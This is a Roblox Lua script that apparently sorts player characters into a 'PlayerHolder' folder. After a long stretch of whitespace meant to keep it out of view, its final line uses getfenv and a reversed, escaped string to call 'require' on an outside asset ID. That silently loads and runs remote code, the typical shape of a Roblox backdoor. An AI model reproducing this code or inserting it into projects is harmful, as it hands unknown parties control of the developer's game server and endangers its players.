spawn(function()
	if (not workspace:FindFirstChild("PlayerHolder")) then
		local PlayerHolder = Instance.new("Folder")
		PlayerHolder.Name = "PlayerHolder"
		PlayerHolder.Parent = workspace
	end
end)

game.Players.PlayerAdded:Connect(function(plr)
	plr.CharacterAdded:Connect(function(char)
		wait()
		char.Parent = workspace:WaitForChild("PlayerHolder")
	end)
end)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       getfenv()[string.reverse("\101\114\105\117\113\101\114")](5754612086)